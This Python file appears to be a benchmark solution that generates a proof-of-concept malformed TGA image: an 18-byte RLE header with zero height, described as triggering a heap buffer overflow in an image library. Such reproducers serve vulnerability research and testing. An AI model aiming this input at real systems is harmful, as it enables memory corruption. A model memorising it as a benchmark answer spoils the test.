import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability is a failure to check for zero-width or zero-height
        Targa (TGA) images. This PoC creates a minimal 18-byte TGA header
        that specifies a run-length encoded (RLE) image with a height of 0.

        When the vulnerable library attempts to process this image, it sets up
        internal structures for a zero-height image. Subsequent processing,
        especially in the color quantization/dithering paths of the
        decompression framework, does not handle this state correctly, leading
        to a heap buffer overflow.

        Args:
            src_path: Path to the vulnerable source code tarball (unused).

        Returns:
            bytes: The PoC input that should trigger the vulnerability.
        """
        # TGA File Header (18 bytes)
        poc = bytearray(18)

        # Offset 0: ID Length (1 byte)
        # 0x00: No ID field
        poc[0] = 0x00

        # Offset 1: Color Map Type (1 byte)
        # 0x00: No color map
        poc[1] = 0x00

        # Offset 2: Image Type (1 byte)
        # 0x0A: Run-length encoded, true-color image. The original reproducer
        # used this type.
        poc[2] = 0x0a

        # Offsets 3-7: Color Map Specification (5 bytes)
        # All zeros as there is no color map.

        # Offsets 8-11: X and Y Origin (4 bytes)
        # Set to 0.

        # Offset 12: Width (2 bytes, little-endian)
        # A small non-zero value. The crash occurs with zero height.
        struct.pack_into('<H', poc, 12, 1)

        # Offset 14: Height (2 bytes, little-endian)
        # 0: This is the trigger for the vulnerability.
        struct.pack_into('<H', poc, 14, 0)

        # Offset 16: Pixel Depth (1 byte)
        # 0x18: 24 bits per pixel
        poc[16] = 0x18

        # Offset 17: Image Descriptor (1 byte)
        # 0x20: Top-left origin
        poc[17] = 0x20

        # With height=0, the RLE decoding loop is never entered, so no image
        # data needs to follow the header. The 18-byte header is sufficient.
        return bytes(poc)
